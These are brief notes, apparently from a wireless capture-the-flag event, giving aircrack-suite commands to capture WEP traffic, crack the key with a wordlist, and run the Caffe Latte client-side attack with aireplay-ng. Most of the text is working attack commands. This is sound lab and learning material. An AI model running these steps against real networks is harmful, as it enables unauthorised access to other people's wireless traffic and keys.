## Classic WEP

Basically run airodump for 10 minutes and aircrack

sudo airmon-ng

sudo airmon-ng start wlan27

sudo airodump-ng  -w derp --output-format pcap --band ag wlan27mon


# wget https://raw.githubusercontent.com/rfhs/wctf-files/master/wordlist/cyberpunk.words
sudo aircrack-ng -w cyberpunk.words derp0-01.cap


## Caffe Latte

How to recognize?
You might find in airodump-ng that there are probes to ESSIDs that aren't found.
This signals a client-side attack


Begin the Caffe Latte Attack by starting an airodump-ng capture and writing the keystream to an output file:

airodump-ng -w cafefile --band ag --essid WCTF_03 wlan29mon


While an airodump-ng capture is running, perform the Caffe-Latte Attack:

aireplay-ng -6 -h 02:00:00:00:1e:00 -b 3A:FD:31:E0:81:F4 -D wlan30mon

    -6 means Cafe-Latte attack
    -h is our card MAC address
    -b is the victim AP
    -D disables AP detection.

find our own mac with `iw dev`

